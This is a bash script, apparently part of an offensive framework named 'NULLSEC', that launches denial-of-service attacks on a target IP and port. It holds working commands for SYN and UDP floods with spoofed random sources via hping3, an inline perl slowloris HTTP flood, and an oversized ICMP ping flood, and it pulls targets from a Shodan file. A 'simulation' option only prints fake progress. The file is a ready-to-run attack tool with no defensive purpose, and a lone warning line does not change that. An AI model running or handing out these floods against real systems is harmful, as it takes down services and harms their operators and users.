#!/bin/bash
# NULLSEC DDoS Attack - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC DDOS ATTACK ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] Target port: '${RESET})" PORT
[ -z "$PORT" ] && PORT="80"

echo ""
echo -e "  ${YELLOW}Attack type:${RESET}"
echo -e "    1) SYN Flood (hping3)"
echo -e "    2) UDP Flood (hping3)"
echo -e "    3) HTTP Flood (slowloris)"
echo -e "    4) ICMP Flood (ping)"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" ATTACK_TYPE
[ -z "$ATTACK_TYPE" ] && ATTACK_TYPE="1"

read -p "$(echo -e ${WHITE}'  [>] Duration (seconds): '${RESET})" DURATION
[ -z "$DURATION" ] && DURATION="30"

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing DDoS attack"
    attacks=("SYN Flood" "UDP Flood" "HTTP Flood" "ICMP Flood")
    echo -e "${DIM}[*] Attack: ${attacks[$((ATTACK_TYPE-1))]}${RESET}"
    echo -e "${DIM}[*] Target: $TARGET:$PORT${RESET}"
    for i in $(seq 1 5); do
        echo -e "${RED}[!]${RESET} Flooding... $((i*20))% ($((i*1000)) packets/sec)"
        sleep 0.5
    done
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live DDoS attack"
    echo -e "${RED}[!] WARNING: DDoS attacks are illegal without authorization${RESET}"
    
    case $ATTACK_TYPE in
        1)
            if ! command -v hping3 &> /dev/null; then
                echo -e "${RED}[!] hping3 not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install hping3${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] SYN Flood for $DURATION seconds...${RESET}"
            timeout $DURATION sudo hping3 -S -p $PORT --flood --rand-source $TARGET
            ;;
        2)
            if ! command -v hping3 &> /dev/null; then
                echo -e "${RED}[!] hping3 not installed${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] UDP Flood for $DURATION seconds...${RESET}"
            timeout $DURATION sudo hping3 --udp -p $PORT --flood --rand-source $TARGET
            ;;
        3)
            if ! command -v slowloris &> /dev/null; then
                echo -e "${YELLOW}[*] Using perl slowloris${RESET}"
                timeout $DURATION perl -e 'use IO::Socket::INET; for(1..200){$s=IO::Socket::INET->new(PeerAddr=>"'$TARGET'",PeerPort=>'$PORT'); print $s "GET / HTTP/1.1\r\nHost: '$TARGET'\r\n"; sleep 1}'
            else
                timeout $DURATION slowloris -s 200 $TARGET
            fi
            ;;
        4)
            echo -e "${CYAN}[*] ICMP Flood for $DURATION seconds...${RESET}"
            timeout $DURATION sudo ping -f -s 65500 $TARGET
            ;;
    esac
    echo -e "${GREEN}[✓]${RESET} Attack complete"
fi
echo ""
